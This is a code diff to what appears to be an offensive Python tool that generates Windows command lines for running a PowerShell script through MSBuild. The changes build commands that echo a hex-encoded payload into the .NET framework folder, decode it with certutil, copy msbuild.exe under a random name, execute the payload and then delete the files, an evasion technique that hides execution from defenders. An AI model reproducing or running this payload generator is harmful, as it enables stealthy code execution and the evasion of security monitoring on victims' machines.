@@ -77,16 +77,15 @@ class Generator:
 		return data
 		
 	def get_error(self):
-		if IS_CMD_ARGS:
+		if IS_CMD_ARGS and self.error == 1:
 			exit(0)
-
 		current = self.error
 		self.error = 0
 		return current
 		
 
 	def gen_final_cmd(self, path):
-		payload = ""
+		payload = "cd C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ && "
 		size = 0
 
 		filepath = []
@@ -95,13 +94,14 @@ class Generator:
 
 		data = self.load_file(path).encode("hex")
 		for chunk in re.findall("." * self.chunk_size, data):
-		        payload += "echo %s >> C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\%s && " % (chunk, filepath[0])
+		        payload += "echo %s >> %s && " % (chunk, filepath[0])
 		        size += self.chunk_size
 
 		if len(data) > size:
-			payload += "echo %s >> C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\%s" % (data[(len(data) - size) * -1:], filepath[0])
+			payload += "echo %s >> %s" % (data[(len(data) - size) * -1:], filepath[0])
 
-		payload += " && certutil -decodehex C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\%s C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\%s && cd C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ && msbuild.exe %s" % (filepath[0], filepath[1], filepath[1])
+		msbuild = self.gen_str(random.randrange(5, 25)) + ".exe"
+		payload += " && certutil -decodehex %s %s && copy msbuild.exe %s && %s %s && del %s && del %s" % (filepath[0], filepath[1], msbuild, msbuild, filepath[1], msbuild, filepath[1])
 		return payload
 
 class RC4:
@@ -148,7 +148,7 @@ if __name__ == "__main__":
 		powershell = gen.capture_input("Path to the PowerShell script", 1)
 		powershell = gen.load_file(powershell, False)	
 		while gen.get_error():
-			powershell = gen.capture_input("Path to the PowerShell script", 1)
+			powershell = gen.capture_input("Path to the PowerShell script")
 			powershell = gen.load_file(powershell, False)
 		
 		outfile = gen.capture_input("Path for the generated MsBuild out file", 2)
